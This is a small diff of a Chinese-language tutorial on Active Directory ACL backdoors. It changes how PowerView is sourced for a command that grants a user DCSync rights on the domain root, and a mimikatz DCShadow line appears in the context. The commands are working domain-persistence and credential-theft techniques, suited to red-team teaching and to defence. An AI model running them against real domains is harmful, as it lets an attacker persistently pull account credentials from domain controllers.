@@ -57,8 +57,9 @@ ACL 全称 Access Control List, 即访问控制列表. 故 ACL 后门, 是指针
 
 ACL 后门的 DCSync 形式.
 
+使用 PowerSploit Dev 分支中的 PowerView.
+
 ```
-Import-Module .\PowerView.ps1
 Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test -Rights DCSync
 ```
 
@@ -147,8 +148,9 @@ lsadump::dcshadow /push
 
 <p>ACL 后门的 DCSync 形式.</p>
 
-<pre><code>Import-Module .\PowerView.ps1
-Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test -Rights DCSync
+<p>使用 PowerSploit Dev 分支中的 PowerView.</p>
+
+<pre><code>Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test -Rights DCSync
 </code></pre>
 
 <p>这样在任意一台主机上以 test 用户登录都能通过 DCSync 向域控请求账户凭据.</p>
